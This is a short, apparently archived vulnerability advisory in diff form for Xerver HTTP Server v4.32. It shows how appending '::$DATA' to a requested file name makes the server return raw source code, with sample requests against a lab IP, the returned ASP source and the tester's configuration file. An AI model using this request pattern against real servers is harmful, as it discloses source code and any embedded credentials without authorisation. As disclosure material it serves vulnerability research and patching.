@@ -1,0 +1,73 @@
+#################################################################################
+#                                                                        	#
+# Xerver HTTP Server v4.32 Remote Arbitrary Source Code Disclosure       	#
+# Found By:	Dr_IDE				                                #
+# Download:	http://www.javascript.nu/xerver                          	#
+# Tested On:	Windows XPSP3                                            	#
+#                                                                        	#
+#################################################################################
+
+- Description -
+
+Xerver v4.32 is a Windows based HTTP server. This is the latest version of
+the application available.
+
+Xerver v4.32 is vulnerable to remote arbitrary source code disclosure by the
+following means.
+
+- Notes -
+	1. This is remote only.
+	2. Out of the box this server is completely unsecure and wide open,
+	my configuration is attached below in case reproduction is an issue.
+
+
+- Technical Details -
+
+	http://[ webserver IP]/[ file ][::$DATA]
+
+
+- Sample Case 1 -
+
+	http://172.16.2.101/index.html::$DATA
+
+- Remote Browser Output - 
+
+	<html><head></head><body> This is my Web page </body></html>
+
+
+- Sample Case 2 -
+
+	http://172.16.2.101/default.asp::$DATA
+
+- Remote Browser Output -
+
+	<html>
+	<body>
+	<%
+	response.write("My first ASP script!")
+	%>
+	</body>
+	</html>
+
+- My Server Configuration-
+
+Filename: Xerver2.cfg
+
+----------------------snip-------------------------------------------------------------------------
+80
+index.html,index.htm,index.shtml,default.html,default.asp,index.php,index.phtml,index.pl,index.cgi
+c:\INETPUB\
+
+c:\INETPUB\
+php=php,php3=php,php4=php,phtml=php,pl=perl,cgi=perl,exe=,bat=
+
+
+0
+0
+0
+2
+1
+XerverWebserver.log
+----------------------snip-------------------------------------------------------------------------
+
+# milw0rm.com [2009-09-11]
